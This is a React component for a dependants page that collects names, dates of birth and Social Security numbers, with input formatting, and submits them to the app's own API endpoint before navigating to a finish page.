import { createContext, useContext, useReducer, useState } from 'react';
import InputField from '../components/InputField';
import styles from './DependantPage.module.css';
import { useNavigate, useParams } from 'react-router-dom';
import Button from '../components/Button';
import { MainSpinner } from '../components/Loader';
import saveData from '../utils/saveData';
import { getLocal, saveLocal } from '../utils/getData';

const Context = createContext(null);

const reducer = (state, { type, payload: { num, value } }) => {
  switch (type) {
    case 'firstName':
      state.at(num).firstName = value;
      return [...state];
    case 'lastName':
      state.at(num).lastName = value;
      return [...state];
    case 'DOB':
      state.at(num).DOB = value;
      return [...state];
    case 'SSN':
      state.at(num).SSN = value;
      return [...state];
  }
};

export default function DependantPage() {
  const [isloading, setIsloading] = useState(false);
  let { num } = useParams();
  num = !num || num === '0' ? 1 : num * 1;

  const initialStates = Array.from({ length: num }, () => ({
    firstName: '',
    lastName: '',
    DOB: '',
    SSN: '',
  }));

  const [states, dispatch] = useReducer(reducer, initialStates);

  const dependants = Array.from({ length: num }, (_, i) => i);

  let id = getLocal('irsystm');
  const navigate = useNavigate();

  async function handleSubmit(e) {
    e.preventDefault();

    setIsloading(true);

    const result = await saveData(
      { id, states },
      `${import.meta.env.VITE_SITE_URL}/api/v1/client/dependants`
    );

    const { status } = result;
    ({ id } = result);

    setIsloading(false);

    // Ask user to retry
    if (!status) return;

    // Save ID into localstorage
    saveLocal('irsystm', id);

    navigate('/finish');
  }

  return (
    <Context.Provider value={{ states, dispatch }}>
      {isloading && <MainSpinner>Securely uploading data</MainSpinner>}

      <main className={`main wrapper ${isloading ? 'opaque' : 'not-opaque'}`}>
        {dependants.map((n) => (
          <Dependant key={n} num={n} />
        ))}
        <SubmitBtn handleSubmit={handleSubmit} />
      </main>
    </Context.Provider>
  );
}

function Dependant({ num }) {
  const { states } = useContext(Context);

  const { firstName, lastName, DOB, SSN } = states.at(num);
  return (
    <div className={styles.box}>
      <h2> Dependant {num + 1}</h2>
      <FirstName firstName={firstName} num={num} />
      <LastName lastName={lastName} num={num} />
      <DateOfBirth DOB={DOB} num={num} />
      <Social SSN={SSN} num={num} />
    </div>
  );
}

function FirstName({ firstName, num }) {
  const { dispatch } = useContext(Context);
  const [isFocus, setIsFocus] = useState(false);

  const handleChange1 = (e) => {
    const value =
      e.target.value.slice(0, 1).toUpperCase() + e.target.value.slice(1);
    dispatch({ type: 'firstName', payload: { value, num } });
  };
  return (
    <InputField
      isFocus={isFocus}
      setIsFocus={setIsFocus}
      value={firstName}
      onChange={handleChange1}
    >
      First Name
    </InputField>
  );
}
function LastName({ lastName, num }) {
  const [isFocus, setIsFocus] = useState(false);
  const { dispatch } = useContext(Context);

  const handleChange1 = (e) => {
    const value =
      e.target.value.slice(0, 1).toUpperCase() + e.target.value.slice(1);
    dispatch({ type: 'lastName', payload: { value, num } });
  };
  return (
    <InputField
      isFocus={isFocus}
      setIsFocus={setIsFocus}
      value={lastName}
      onChange={handleChange1}
    >
      Last Name
    </InputField>
  );
}

function DateOfBirth({ DOB, num }) {
  const [isFocus, setIsFocus] = useState(false);
  const { dispatch } = useContext(Context);

  const handleChange = (e) => {
    const val = e.target.value;
    if (val.match(/[^0-9-]+/g)) return;
    if (val.length > 10) return;
    dispatch({ type: 'DOB', payload: { value: val, num } });

    if (val.length < 2 || val.length === 2) {
      let v = val;
      if (Number(val.at(0)) > 1) v = val.padStart(2, 0);
      if (Number(val) > 12) v = 12;
      dispatch({ type: 'DOB', payload: { value: v, num } });
    }
    if (val.length === 3) {
      let v = val.at(2);
      if (Number(v) > 3) v = v.padStart(2, 0);
      dispatch({
        type: 'DOB',
        payload: { value: `${val.slice(0, 2)}-${v}`, num },
      });
    }
    if (val.length === 5) {
      let v = val.slice(3);
      if (Math.abs(Number(v)) > 31) v = 31;
      dispatch({
        type: 'DOB',
        payload: { num, value: `${val.slice(0, 2)}-${v}` },
      });
    }
    if (val.length === 6) {
      dispatch({
        type: 'DOB',
        payload: {
          num,
          value: `${val.slice(0, 2)}-${val.slice(3, 5)}-${val.slice(-1)}`,
        },
      });
    }
    if (val.length === 6 && val.at(-1) === '-')
      dispatch({
        type: 'DOB',
        payload: { num, value: `${val.slice(0, 2)}-${val.slice(3, 5)}` },
      });
    if (val.length === 3 && val.at(-1) === '-')
      dispatch({ type: 'DOB', payload: { num, value: `${val.slice(0, 2)}` } });
  };
  return (
    <InputField
      isFocus={isFocus}
      setIsFocus={setIsFocus}
      value={DOB}
      onChange={handleChange}
    >
      Date Of Birth
    </InputField>
  );
}

function Social({ SSN, num }) {
  const { dispatch } = useContext(Context);
  const [isFocus, setIsFocus] = useState(false);

  const handleChange = (e) => {
    const val = e.target.value;
    if (val.match(/[^0-9-]+/g)) return;
    if (val.length > 11) return;
    dispatch({ type: 'SSN', payload: { num, value: val } });
    if (val.length === 4 && val[3] !== '-')
      dispatch({
        type: 'SSN',
        payload: { num, value: `${val.slice(0, 3) + '-' + val.slice(-1)}` },
      });

    if (val.length === 7 && val[6] !== '-')
      dispatch({
        type: 'SSN',
        payload: { num, value: `${val.slice(0, 6) + '-' + val.slice(-1)}` },
      });

    if (val.at(6) === '-' && val.length === 7)
      dispatch({ type: 'SSN', payload: { num, value: val.slice(0, 6) } });

    if (val.at(3) === '-' && val.length === 4)
      dispatch({ type: 'SSN', payload: { num, value: val.slice(0, 3) } });
  };
  return (
    <InputField
      isFocus={isFocus}
      setIsFocus={setIsFocus}
      onChange={handleChange}
      value={SSN}
    >
      Social Security Number
    </InputField>
  );
}

function SubmitBtn({ handleSubmit }) {
  return (
    <Button onClick={handleSubmit} type="primary" length="long">
      Submit
    </Button>
  );
}
